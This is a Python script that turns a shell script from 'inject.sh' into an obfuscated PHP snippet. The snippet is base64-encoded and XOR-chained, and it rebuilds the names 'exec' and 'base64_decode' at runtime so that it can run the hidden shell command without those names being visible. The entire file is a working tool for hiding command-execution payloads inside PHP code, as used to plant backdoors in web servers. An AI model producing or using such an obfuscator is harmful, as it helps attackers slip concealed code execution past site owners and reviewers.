#!/usr/bin/python3

import base64
import random
import string

implode = base64.b64encode("implode".encode('ascii'))


with open('inject.sh', 'r') as file:
    inject = file.read()
    
print("To inject:")
print(inject)

command = inject #"sh -c '" + inject.replace("'","\\'") + "'"
print("Command:")
print(command)


commandText = base64.b64encode(command.encode('ascii')).decode('ascii')
text = [commandText, "exec", "base64_decode"]
print("To encode:")

arr = []
for m in text:
	l = len(m)
	print("Encode (%d): %s" % (l, m))
	arr.append(l & 0xFF)
	arr.append((l >> 8) & 0xFF)
	for c in m:
		arr.append(ord(c))
		
print(arr)
			
startXor = random.randint(20, 255)

encoded = [0] * len(arr)
encoded[0] = arr[0] ^ startXor

for j in range(1, len(arr)):
	encoded[j] = arr[j] ^ encoded[j-1]

print(encoded)
	
print("Special sauce:")	
print('$k = base64_decode("' + base64.b64encode(bytes(encoded)).decode('ascii') + '");')
print("for($i = 0; $i < strlen($k); $i++) $z[] = chr(ord($k[$i]) ^ (($i > 0) ? ord($k[$i-1]) : " + str(startXor) + "));")
print("""for($j = 0; $j < count($z); $j += $h + 2){$h = ord($z[$j]) | (ord($z[$j+1]) << 8); $b[] = array_slice($z, $j+2, $h); }
$p = array_map(base64_decode("aW1wbG9kZQ=="), $b);
$p[1]($p[2]($p[0]));""")

